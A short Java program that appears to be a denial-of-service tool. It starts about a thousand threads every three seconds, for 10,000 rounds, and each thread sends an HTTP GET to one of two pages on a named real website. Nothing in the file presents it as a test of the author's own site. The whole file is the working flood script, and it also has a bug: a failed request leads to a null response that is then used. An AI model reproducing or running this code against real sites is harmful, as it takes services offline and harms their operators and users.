import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import java.io.IOException;
import java.util.Random;

/**
 * Created by <a href="mailto:wallellen@hotmail.com">WALLE</a> on 4/7/16.
 */
public class Main {
    private static int index = 0;

    /**
     * @param args
     * @throws IOException
     * @throws ClientProtocolException
     */
    public static void main(String[] args) throws IOException, InterruptedException {
        // 创建HttpClient实例

        // 创建Get方法实例
        for (int j = 1; j < 10000; j++) {
            for (int i = 1; i < 1000; i++) {
                new Thread(
                        new Run(new DefaultHttpClient(), new Random().nextInt(i) % 2 == 0 ? new HttpGet("http://www.hjpjt.com/html/main.asp") : new HttpGet("http://www.hjpjt.com/html/job.asp")))
                        .start();
            }

            Thread.sleep(3000);
        }
    }

    private static class Run implements Runnable {
        private HttpGet get;
        private HttpClient client;

        public Run(HttpClient client, HttpGet get) {
            this.client = client;
            this.get = get;
        }

        @Override
        public void run() {
            System.err.println(index++);

            HttpResponse response = null;
            try {
                response = client.execute(get);
            } catch (IOException e) {
                e.printStackTrace();
            }
            HttpEntity entity = response.getEntity();
            if (entity != null) {
            }
        }
    }
}
